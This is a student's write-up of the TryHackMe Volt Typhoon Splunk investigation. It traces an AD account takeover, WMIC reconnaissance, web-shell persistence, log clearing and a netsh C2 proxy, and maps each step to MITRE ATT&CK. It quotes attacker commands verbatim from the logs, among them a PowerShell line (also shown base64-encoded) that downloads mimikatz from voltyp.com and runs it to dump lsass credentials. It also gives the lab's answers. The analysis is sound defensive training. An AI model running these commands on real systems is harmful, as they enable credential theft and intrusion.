# Volt Typhoon Incident Investigation (Splunk)

📌 [Skip to the Summary, Key Takeaways, and Lessons Learned](#Conclusion) 


## Overview

This project simulates a Security Operations Center (SOC) investigation into activity associated with the Volt Typhoon threat actor. Using log sources collected over a two-week period, the objective was to identify the attack timeline, analyze attacker behavior, map activity to the MITRE ATT&CK framework, and determine the scope of compromise.

**Platform:** Splunk
**Scenario:** TryHackMe - Volt Typhoon
**Role:** SOC Analyst
**Focus Areas:** Threat Hunting, Log Analysis, Incident Response, MITRE ATT&CK Mapping

---

## Objectives

* Identify indicators of compromise (IOCs)
* Determine the initial access vector
* Trace attacker movement throughout the environment
* Identify persistence mechanisms
* Detect privilege escalation activity
* Investigate command and control (C2) communications
* Map attacker actions to MITRE ATT&CK techniques
* Produce a complete attack timeline

---

## Threat Actor Background

Volt Typhoon is a state-sponsored threat actor known for targeting critical infrastructure and maintaining long-term access through stealthy "living-off-the-land" techniques. The group frequently leverages legitimate administrative tools and native operating system functionality to evade detection.

<img width="959" height="439" alt="VoltTyphoonSum" src="https://github.com/user-attachments/assets/650da48f-cdcf-4352-af56-ea3f89fd99cf" />



### Common TTPs

| Tactic            | Examples                               |
| ----------------- | -------------------------------------- |
| Initial Access    | Exploitation of public-facing services |
| Persistence       | Scheduled Tasks, Services              |                            
| Discovery         | System and Network Enumeration         |
| Credential Access | Credential Dumping                     |
| Lateral Movement  | Remote Services                        |
| Command & Control | Encrypted Channels                     |
| Defense Evasion   | Living-off-the-Land Binaries (LOLBins) |

---


# Investigation Methodology

## Task 2: Initial Access

Volt Typhoon often gains initial access to target networks by exploiting vulnerabilities in enterprise software. In recent incidents, Volt Typhoon has been observed leveraging vulnerabilities in Zoho ManageEngine ADSelfService Plus, a popular self-service password management solution used by organizations.

### Questions asked:

1. Comb through the ADSelfService Plus logs to begin retracing the attacker’s steps. At what time (ISO 8601 format) was Dean's password changed and their account taken over by the attacker?
2. Shortly after Dean's account was compromised, the attacker created a new administrator account. What is the name of the new account that was created?


### Walkthrough
1) For this one I simply drilled down into the correct sourcelog mentioned in the question (ADSS), then since I know we're looking for a changed password, I filtered into the action_name field by "password change". Finally since were looking for when Dean's password was changed, I looked into the username field and came up with 2 events. I just looked at the one that said the password change was completed successfully. Ans: 2024-03-24T11:10:22

<img width="1902" height="702" alt="FindingT1" src="https://github.com/user-attachments/assets/f9e199a8-4dde-4695-b8b2-0bbad5e88eaa" />
<img width="952" height="346" alt="FindingT2" src="https://github.com/user-attachments/assets/141ef1b5-6435-4b88-867a-3535747f4013" />
<img width="950" height="138" alt="FindingT4" src="https://github.com/user-attachments/assets/7c628922-8a01-4d7c-948a-aac10b479365" />
<img width="958" height="359" alt="FindingT5" src="https://github.com/user-attachments/assets/8259631c-b12d-4618-b022-6536c8df2575" />

---

2) For this one, the question asks us to find the new account created and we know it was created after the dean-admin account password was changed, so I used that time to filter for all events after that time again in the adss logs. Afterwards we filer into field actionname= "enrollment" and came up with 1 event. Ans: voltyp-admin

<img width="953" height="368" alt="FindingA1" src="https://github.com/user-attachments/assets/77542f89-1cf7-436f-93da-da57c1f47f71" />
<img width="950" height="413" alt="FindingA2" src="https://github.com/user-attachments/assets/85b311f7-e079-4d81-bf78-667e6ad22507" />
<img width="956" height="344" alt="FindingA3" src="https://github.com/user-attachments/assets/fe9a3478-f0e8-4720-852f-9d28108d275e" />




---

## Phase 3: Execution

Volt Typhoon is known to exploit Windows Management Instrumentation Command-line (WMIC) for a range of execution techniques. They leverage WMIC for tasks such as gathering information and dumping valuable databases, allowing them to infiltrate and exploit target networks. By using "living off the land" binaries (LOLBins), they blend in with legitimate system activity, making detection more challenging. 
<img width="954" height="372" alt="VT2" src="https://github.com/user-attachments/assets/fda453f4-fdd2-4967-a9a2-70d330be465c" />
<img width="955" height="445" alt="WMIC" src="https://github.com/user-attachments/assets/7ff65160-9de2-4fe1-bbda-9bede356cada" />


### Questions asked:

1. In an information gathering attempt, what command does the attacker run to find information about local drives on server01 & server02?
2. The attacker uses ntdsutil to create a copy of the AD database. After moving the file to a web server, the attacker compresses the database. What password does the attacker set on the archive?
------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Walkthrough
1) For this one the question told us we were looking for a command run to gather info about server01 & server02 so I used the keyword server01 in the search to see what I'd fine and 11 events were returned. Then I simply filtered into the events from the WMIC logs which only had 1 event. Ans: wmic /node:server01, server02 logicaldisk get caption, filesystem, freespace, size, volumename

<img width="951" height="392" alt="WMICS2" src="https://github.com/user-attachments/assets/44707ab8-757a-4dc3-85f6-80080dfaf7b0" />
<img width="950" height="394" alt="WMICS3" src="https://github.com/user-attachments/assets/a66bccc4-59db-4ba5-8e2a-30fc58f7bc7e" />
<img width="957" height="371" alt="WMICS4" src="https://github.com/user-attachments/assets/1e8946cb-eceb-42a5-bce1-82a45d30c965" />

---
2) For this one we are told the attackers used ntdsutil to create a copy of the database, therefore again the first thing I did was search and see if I can find anything by searching the key word ntdsutil. I found 1 event which had a very long and complicated command. I had to do some research to fully understand what it meant and what had been done on the computer. I was able to learn that a temp folder was created with a file called temp.dit on server01 so the next thing I searched was for that file. 3 events showed up and we found the one we looking for. Ans: d5ag0nm@5t3r

<img width="951" height="416" alt="NTD1" src="https://github.com/user-attachments/assets/6cb848a2-a5db-479b-9882-fddc1ab0581e" />
<img width="956" height="317" alt="WMICP" src="https://github.com/user-attachments/assets/f1f0c60e-3211-4ba9-92c9-e2f85a865791" />



### Findings

Ntdsutil Research
- ntdsutil is a built-in Windows command-line tool used to manage and maintain Active Directory (AD) database services. Can be used for Active Directory database maintenance (NTDS.dit), Creating backups of AD data, Restoring domain controllers, and Cleaning up metadata from removed domain controllers.
- This is important for cybersecurity because ntdsutil can access or copy the Active Directory database, which could contain User accounts, Password hashes, Group memberships and Domain structure.

---

## Task 4: Persistence

Our target APT frequently employs web shells as a persistence mechanism to maintain a foothold. They disguise these web shells as legitimate files, enabling remote control over the server and allowing them to execute commands undetected.

### Questions asked:

1. To establish persistence on the compromised server, the attacker created a web shell using base64 encoded text. In which directory was the web shell placed?

----------------------------------------------------------------------------------------------------------------------------------------------------------------
### Walkthrough
1) For this one the question essentially told us that web shells were placed in the environment, but we don't know where so I decided to check the mitre attack page since the over arching theme of this ctf is the threat actor Volt Typhoon. I just went to their page on Mitre and search for webshell as a keyword to see if anything was documented about them using webshells. I was able to find that they specially have used two webshells in past campagins and did a search for them. We are able to see what folder they are in my looking at the 1 event found in the log. Ans: C:\Windows\Temp\

<img width="949" height="442" alt="TF1" src="https://github.com/user-attachments/assets/130403b5-9619-4597-8aee-0050cc0c04ae" />

<img width="955" height="392" alt="image" src="https://github.com/user-attachments/assets/bb680b10-0ce1-4ab8-ac94-da80a71a86f4" />


---

## Task 5: Defense Evasion

Volt Typhoon utilizes advanced defense evasion techniques to significantly reduce the risk of detection. These methods encompass regular file purging, eliminating logs, and conducting thorough reconnaissance of their operational environment.

### Questions asked:

1. In an attempt to begin covering their tracks, the attackers remove evidence of the compromise. They first start by wiping RDP records. What PowerShell cmdlet does the attacker use to remove the “Most Recently Used” record?
2.The APT continues to cover their tracks by renaming and changing the extension of the previously created archive. What is the file name (with extension) created by the attackers?
3. Under what regedit path does the attacker check for evidence of a virtualized environment? 

----------------------------------------------------------------------------------------------------------------------------------------------------------------
### Walkthrough
1) First thing I did was filter into the powershell logs with the time filter still set to all the events after the dean-admin account was compromised. I also used the keywords "RDP", "Most", "delete",  and "remove" to see if that will narrow down the searches. "Delete", "RDP", and "Most" didn't return anything, but remove returned 6 events which had the answer. Ans: Remove-ItemProperty

<img width="952" height="196" alt="Remove1" src="https://github.com/user-attachments/assets/7295c4aa-9f7a-413e-955d-4b383e7c5819" />
<img width="952" height="413" alt="Remove2" src="https://github.com/user-attachments/assets/647c8ed4-2636-47d9-b5a3-710e2801bf30" />

---
2) This question was more of a grind, I didn't have any keyword or anything I could think of that would help so again I set the time filter to see all the events after the dean-admin account was compromised and looked through them one by one. Luckily I didn't have to go too far, I eventually came upon this command that looked suspicous simply because I had been starting to get familiar more and more WMIC and how to read those commands through the course of this challenge. After researching this one as well I found it had the answer. Ans: cl64.gif

<img width="950" height="233" alt="EXT2" src="https://github.com/user-attachments/assets/ac263560-7102-46ab-889f-652c3e044424" />


<img width="952" height="421" alt="EXT1" src="https://github.com/user-attachments/assets/9be2b5c7-a124-45f9-8bd5-ca0ff32188f9" />

---
3) I just used the keyword virtal to look for anything since dean's account was compromised and found 1 event. Ans: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control

<img width="949" height="411" alt="Virtual1" src="https://github.com/user-attachments/assets/8926a8e6-d066-411b-86cd-d41239fe8d4d" />


---

## Task 6: Credential Access

Volt Typhoon often combs through target networks to uncover and extract credentials from a range of programs. Additionally, they are known to access hashed credentials directly from system memory.

### Questions asked:

1. Using reg query, Volt Typhoon hunts for opportunities to find useful credentials. What three pieces of software do they investigate? Answer Format: Alphabetical order separated by a comma and space.
2. What is the full decoded command the attacker uses to download and run mimikatz?
--------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Walkthrough
1) This was another one that could be found by doing some research on the APT in Mitre website. Just by scrolling through and learning about some of their common TTP's I was able to find the potential answers. Ans: OpenSSH, putty, realvnc

<img width="956" height="441" alt="CR1" src="https://github.com/user-attachments/assets/391a3770-6d0a-4f67-a06e-057b6d10603f" />
<img width="958" height="442" alt="CR2" src="https://github.com/user-attachments/assets/689b1e6b-16ff-48a3-a717-34e65884dcce" />

---

2) To find the full command I tried to filter by key words to no avail then simply filterd the powershell logs and started searching them one by one. After scrolling through 6 pages of events, I eventually came upon this long encoded command and knew it was something. I copied it into cyberchef to decode it and was able to see the command that used to download mimikatz.
Ans: Invoke-WebRequest -Uri "http://voltyp.com/3/tlz/mimikatz.exe" -OutFile "C:\Temp\db2\mimikatz.exe"; Start-Process -FilePath "C:\Temp\db2\mimikatz.exe" -ArgumentList @("sekurlsa::minidump lsass.dmp", "exit") -NoNewWindow -Wait


<img width="953" height="413" alt="Mi1" src="https://github.com/user-attachments/assets/bbd6deed-dab5-47a4-9e15-7f6af94dc9c7" />

<img width="955" height="295" alt="Mi2" src="https://github.com/user-attachments/assets/8696fb21-1b9c-4f39-8b5e-ced08b89a557" />
<img width="952" height="394" alt="Mi4" src="https://github.com/user-attachments/assets/cded4ee2-9554-4814-8136-e1d67d836d4d" />
<img width="956" height="258" alt="Mi5" src="https://github.com/user-attachments/assets/6954192e-ea7c-4a03-b112-0eddb1afea58" />


---

## Task 7: Discovery & Lateral Movement

Volt Typhoon uses enumeration techniques to gather additional information about network architecture, logging mechanisms, successful logins, and software configurations, enhancing their understanding of the target environment for strategic purposes.

The APT has been observed moving previously created web shells to different servers as part of their lateral movement strategy. This technique facilitates their ability to traverse through networks and maintain access across multiple systems.

### Questions asked:

1. The attacker uses wevtutil, a log retrieval tool, to enumerate Windows logs. What event IDs does the attacker search for? Answer Format: Increasing order separated by a space.
2. Moving laterally to server-02, the attacker copies over the original web shell. What is the name of the new web shell that was created?

----------------------------------------------------------------------------------------------------------------------------------------------------------------------

### Walkthrough

1) This was one that could be found by searching up the keyword wevutil. It turned up a few results where you could see the answers. Ans: 4624 4625 4769

<img width="950" height="414" alt="WE1" src="https://github.com/user-attachments/assets/918f5e41-017e-4452-acde-13a98dd983c7" />

---
2) From task 4 you can remember that a webshell was placed in the temp directory. By going through the powershell events one by one I saw that the command used to do so was another encoded command was used to place the web with the name ntuser.ini. Right after that the certutil command was used to decode it and change its name to iisstart.aspx, so by searching for iisstart.aspx you could've found the answer. The logic could've also been just remembering from the mitre page that Volt Typhoon uses two types of webshells, and again by searching you would have found. Ans: AuditReport.jspx


<img width="955" height="332" alt="Copy1" src="https://github.com/user-attachments/assets/111a8225-b0fb-48ea-a311-4ac423eff4af" />



### Findings/ Lessons Learned
Wevtutil Research
- Wevtutil is a built-in Windows utility for managing and interacting with Event Logs via the command line. Can be used for viewing, searching, exporting, and clearing logs.
- This is important for cybersecurity because Windows Event Logs contain Logon events, Process creation, PowerShell activity, Service changes, and System errors all of which can be of interest to attackers.

Certutil Research
- Certutil is a built-in Windows command-line tool used for managing certificates and cryptographic services.
-  This is important for cybersecurity because it can be leveraged to Download or stage files indirectly, Encode payloads to hide them in logs, Decode hidden or obfuscated malware, or Bypass basic security detection completely.


---

## Task 8: Collection

During the collection phase, Volt Typhoon extracts various types of data, such as local web browser information and valuable assets discovered within the target environment.

### Questions asked:

1) The attacker is able to locate some valuable financial information during the collection phase. What three files does Volt Typhoon make copies of using PowerShell?
Answer Format: Increasing order separated by a space.
--------------------------------------------------------------------------------------------------------------------------------------------------------------
### Walkthrough

1) Honestly I happended to find these while going through all the powershell logs. Ans: 2022.csv 2023.csv 2024.csv

<img width="956" height="414" alt="Finance1" src="https://github.com/user-attachments/assets/717906fa-4cd2-415d-b1ba-73b67eb7802e" />


---

## Task 9: C2 & Cleanup

Volt Typhoon utilizes publicly available tools as well as compromised devices to establish discreet command and control (C2) channels.

To cover their tracks, the APT has been observed deleting event logs and selectively removing other traces and artifacts of their malicious activities.

### Questions asked:

1.The attacker uses netsh to create a proxy for C2 communications. What connect address and port does the attacker use when setting up the proxy?
Answer Format: IP Port
2.To conceal their activities, what are the four types of event logs the attacker clears on the compromised system?
-----------------------------------------------------------------------------------------------------------------------------------------------------------

### Walkthrough

1) For this one you had to search for the keyword netsh in the WMIC logs
<img width="950" height="416" alt="Netsh2" src="https://github.com/user-attachments/assets/668cb65b-6f64-4fef-a2a5-26e0db2619d9" />


2) For this I filtered the powershell logs by decending time since deleteing logs is a clean up action. After scrolling through a few logs I found the answer.
<img width="959" height="407" alt="Clean1" src="https://github.com/user-attachments/assets/f4c5e6d9-28c5-45df-a554-c9b9b378a001" />

### Findings/ Lessons Learned
WMIC Research
- WMIC (Windows Management Instrumentation) is a Windows tool used to query, manage, and interact with system components from the command-line
- This is important for cybersecurity because because it is built into Windows, but can be used for both legitimate and malicious activity like Remote code execution
Lateral movement, System discovery and Process creation on remote hosts.

---

## Extra 

Although not required as part of the challenge, I chose to recreate a timeline of events from the available logs to further develop my incident response and digital forensics skills. By correlating timestamps, process executions, file modifications, and attacker activity, I was able to build a chronological view of the intrusion from initial actions through cleanup efforts.

This exercise provided valuable experience in reconstructing an attacker's actions and understanding how individual events fit into the broader attack timeline. Creating a timeline is a critical skill for security analysts, as it helps identify the sequence of events, determine attacker objectives, and support effective incident response and forensic investigations.

- 3/24/24 @ 11:10:22 - Dean-admin password is changed and attacker gains admin privileges
- 
- 3/24/24 @ 11:11:12 - Voltype-admin account is created in WMIC w/pw Password='as&9ha2e$#&@n22n('
-
- 3/24/24 @ 1:55:10 - User ran multiple enumeration commands between this time like( wmic bios get version | executed | success |, wmic logicaldisk get description, providername | executed | success |, wmic logicaldisk get size,freespace,caption | executed | success |, and more
->
->
-> 3/25/24 @ 9:30:03 User executed command wmic /node:server01, server02 logicaldisk get caption, filesystem, freespace, size, volumename | executed | success | 


- 3/25/24 @ 10:45:27 Attacker uses wmic process call create "cmd.exe /c mkdir C:\Windows\Temp\tmp & ntdsutil.exe \"ac i ntds\" \"ifm create full C:\Windows\Temp\tmp\temp.dit"" | executed | success |, to copy the database

- 3/25/24 @ 10:47:07 Attacker compresses and sets the pw on the copy of the database


- 3/26/24 @ 9:04:49pm Remove-ItemProperty -Path $registryPath -Name MRU0 -ErrorAction SilentlyContinue is run for the 2nd time with the first being @ 3/25/24 @9:48:28 in order to  remove the "Most recently used record"

- 3/26/24 @ 9:15:18pm Attacker looks for evidence of virtual machine using command Get-ItemProperty -Path "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control" | Select-Object -Property *Virtual*

- 3/26/24 @ 9:53:41.000 PM Mimikatz is downloaded  the computer with a base 64 encoded command into the "C:\Temp\db2\ folder "-exec bypass -W hidden -nop -E SW52b2tlLVdlYlJlcXVlc3QgLVVyaSAiaHR0cDovL3ZvbHR5cC5jb20vMy90bHovbWltaWthdHouZXhlIiAtT3V0RmlsZSAiQzpcVGVtcFxkYjJcbWltaWthdHouZXhlIjsgU3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggIkM6XFRlbXBcZGIyXG1pbWlrYXR6LmV4ZSIgLUFyZ3VtZW50TGlzdCBAKCJzZWt1cmxzYTo6bWluaWR1bXAgbHNhc3MuZG1wIiwgImV4aXQiKSAtTm9OZXdXaW5kb3cgLVdhaXQ="

- 3/27/24 @ 11:51:55.000 PM, 11:52:15.000 PM, and 11:52:49.000 the attacker makes copies of valuable financial information in 2022.csv 2023.csv 2024.csv respectfully


- 3/28/24 @ 9:14:57.000 PM An encoded webshell is placed in the temp directory as C:\Windows\Temp\ntuser.ini

- 3/28/24 @ 9:19:23.000 PM Right after webshell is placed the certutil command is used to decode it and write the contents to a new file isstart.aspx with command " certutil -decode C:\Windows\Temp\ntuser.ini C:\Windows\Temp\iisstart.aspx"


3/29/24 @ 7:47:43.000 PM The webshell was copied over to the server with a different name(AuditReport.jspx) using the command "Copy-Item -Path "C:\Windows\Temp\iisstart.aspx" -Destination "\\server-02\C$\inetpub\wwwroot\AuditReport.jspx"

3/29/24 @ 10:04:23.000 PM The attacker clears the Application Security Setup and System logs using the command "wevtutil cl Application Security Setup System"

- 3/29/24 @11:13:09 wmic /node: server-01 /user: dean-admin /password: uNcr4cK4b1e process call create “cmd.exe /c netsh interface portproxy add v4tov4 listenport=50100 listenaddress=0.0.0.0 connectport=8443 connectaddress=10.2.30.1” | executed | success | is run and it uses WMIC to remotely execute a command on another Windows machine (server-01). The remote command creates a port forwarding rule using netsh interface portproxy, which can redirect traffic from one port to another.

- 3/29/24 @ 11:56:30  user later removes this port with command wmic /node: server-01 /user: dean-admin /password: uNcr4cK4b1e process call create “cmd.exe /c netsh interface portproxy delete v4tov4 listenport=50100 listenaddress=0.0.0.0" | executed | success |




---


## Conclusion

This lab reinforced the importance of conducting research and leveraging open-source intelligence resources during security investigations. Throughout the investigation, I used resources such as the MITRE ATT&CK Framework to better understand adversary behaviors, techniques, and the tools associated with the Volt Typhoon threat group. This helped me connect observed activity in the logs to known attack techniques and build a more complete picture of the attack chain.

One of the most valuable lessons from this lab was learning how to investigate technologies and commands that I was not previously familiar with. During the analysis, I encountered multiple WMIC commands and took the opportunity to research how Windows Management Instrumentation (WMI) is used for system administration, remote execution, and adversary activity. I also gained a better understanding of commands such as `wevtutil`, which can be used to manage and clear Windows Event Logs, and `certutil`, which can be used for certificate management as well as encoding and decoding files. Learning the purpose of these utilities provided important context when analyzing attacker behavior and identifying potentially malicious activity.

Overall, this lab strengthened my ability to perform threat investigations, conduct independent research, and analyze unfamiliar tools and commands within a security context. It highlighted the importance of continuously learning and using available resources to better understand attacker techniques and improve detection and response capabilities.


